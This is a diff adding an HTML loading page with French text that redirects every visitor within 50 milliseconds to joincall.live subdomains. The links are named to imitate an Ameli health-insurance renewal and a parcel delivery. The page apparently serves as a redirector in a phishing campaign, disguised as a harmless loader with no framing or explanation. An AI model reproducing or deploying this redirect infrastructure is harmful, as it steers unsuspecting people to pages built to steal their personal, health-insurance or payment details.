@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title></title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+    }
+    .center-container {
+      display: flex;
+      align-items: center;      /* vertical */
+      justify-content: center;  /* horizontal */
+      min-height: 100vh;        /* full viewport height */
+      background: #FAF5F5;         /* optional: contrast for the loader */
+      color: #FAE92F;
+      flex-direction: column;
+      gap: 12px;
+      text-align: center;
+    }
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #fff;
+      border-bottom-color: #cbce14;
+      border-radius: 50%;
+      display: inline-block;
+      box-sizing: border-box;
+      animation: rotation 1s linear infinite;
+    }
+    @keyframes rotation {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Accessibility: reduce motion if user prefers */
+    @media (prefers-reduced-motion: reduce) {
+      .loader { animation: none; }
+    }
+  </style>
+</head>
+<body>
+  <div class="center-container" role="status" aria-live="polite">
+    <span class="loader" aria-label="Loading"></span>
+    <p>si rien ne se passe, <a id="redirect-link" href="https://amelie-renouvellement.joincall.live/Renouvellement/">cliquez ici</a>.</p>
+  </div>
+
+  <script>
+    // Simple delay + redirect
+    setTimeout(function () {
+      if (navigator.userAgent && navigator.userAgent.length > 0) {
+        window.location.href = "https://livraison.joincall.live/Colis";
+      }
+    }, 50);
+  </script>
+
+  <noscript>
+    <div class="center-container" style="background:#fff; color:#000;">
+      <p>JavaScript est requis pour accéder à cette page.</p>
+      <p><a href="https://livraison.joincall.live">Aller à la page</a></p>
+    </div>
+  </noscript>
+</body>
+</html>
